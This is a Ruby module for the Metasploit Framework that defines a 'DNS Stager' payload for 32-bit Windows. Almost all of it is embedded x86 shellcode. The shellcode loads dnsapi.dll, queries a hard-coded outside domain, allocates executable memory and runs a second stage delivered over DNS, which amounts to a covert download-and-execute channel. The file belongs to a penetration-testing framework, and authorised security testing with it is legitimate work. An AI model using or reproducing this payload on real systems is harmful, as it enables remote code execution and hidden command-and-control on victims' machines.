####################################
# Created by Daan Raman
# Universiteit Gent, 2011
####################################

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/dns_tunnel'


module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Windows

  def self.handler_type_alias
		"dns_tunnel"
	end
	
	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'DNS Stager',
			'Version'       => '$Revision: 1 $',
			'Description'   => 'Tunnel communication over DNS' ,
			'Author'        => ['daanRaman'] ,
			'License'       => MSF_LICENSE,
			'Platform'      => 'win' ,
			'Arch'          => ARCH_X86 ,
			'Handler'       => Msf::Handler::DnsTunnel ,
			'Convention'    => 'sockedi dnstunnel' ,
			'Stager'        =>
				{
				  
					'Offsets' =>
						{},
					'Payload' =>
						# Name: stager_dns_tunnel
            # Length: 518 bytes
            "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
            "\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
            "\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
            "\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
            "\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
            "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
            "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
            "\x31\xDB\xE8\xAC\x00\x00\x00\x68\x54\xCA\xAF\x91\x50\x68\x8E\x4E" +
            "\x0E\xEC\x50\xE8\xAE\x00\x00\x00\xE8\x0B\x00\x00\x00\x64\x6E\x73" +
            "\x61\x70\x69\x2E\x64\x6C\x6C\x00\xFF\xD0\x68\x1C\x9D\x44\xD6\x50" +
            "\xE8\x91\x00\x00\x00\x96\xE8\x8B\x00\x00\x00\x6A\x40\x80\xC7\x10" +
            "\x53\xBB\x00\x00\x10\x00\x53\x6A\x00\xFF\xD0\x97\x57\xE9\xC4\x00" +
            "\x00\x00\x5B\x6A\x00\x57\x6A\x00\x6A\x08\x6A\x10\x53\xFF\xD6\x85" +
            "\xC0\x75\x4F\x56\x8B\x37\x8B\x76\x1C\x31\xC9\x50\x53\x51\x31\xC0" +
            "\x8A\x2C\x06\x40\x8A\x0C\x06\x40\x66\x81\xE9\x41\x41\xC0\xE5\x04" +
            "\x08\xE9\xD1\xE8\x88\x0F\x47\xD1\xE0\x3D\xC8\x00\x00\x00\x75\xE0" +
            "\x59\x5B\x58\x5E\x43\x43\xFE\x03\x80\x3B\x39\x7E\x13\xC6\x03\x30" +
            "\xFE\x43\xFF\x80\x7B\xFF\x39\x7E\x07\xC6\x43\xFF\x30\xFE\x43\xFE" +
            "\xEB\x9B\xC3\x64\x8B\x43\x04\x8B\x40\xE4\x48\x66\x31\xC0\x66\x81" +
            "\x38\x4D\x5A\x75\xF5\xC3\x60\x8B\x6C\x24\x24\x8B\x45\x3C\x8B\x54" +
            "\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x34\x49\x8B" +
            "\x34\x8B\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74\x07\xC1\xCF" +
            "\x0D\x01\xC7\xEB\xF4\x3B\x7C\x24\x28\x75\xE1\x8B\x5A\x24\x01\xEB" +
            "\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44" +
            "\x24\x1C\x61\xC2\x08\x00\xE8\x37\xFF\xFF\xFF\x30\x30\x30\x2E\x61" +
            "\x7A\x65\x72\x74\x6F\x6E\x74\x75\x6E\x6E\x65\x6C\x2E\x63\x68\x69" +
            "\x63\x6B\x65\x6E\x6B\x69\x6C\x6C\x65\x72\x2E\x63\x6F\x6D\x00\x6A" +
            "\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40" +
            "\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93" +
            "\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29" +
            "\xC6\x85\xF6\x75\xEC\xC3"
				}
			))
	end
	
	#
	# Do not transmit the stage over the connection.  We send the stage via DNS requests.
	#
	def stage_over_connection?
		false
	end
end

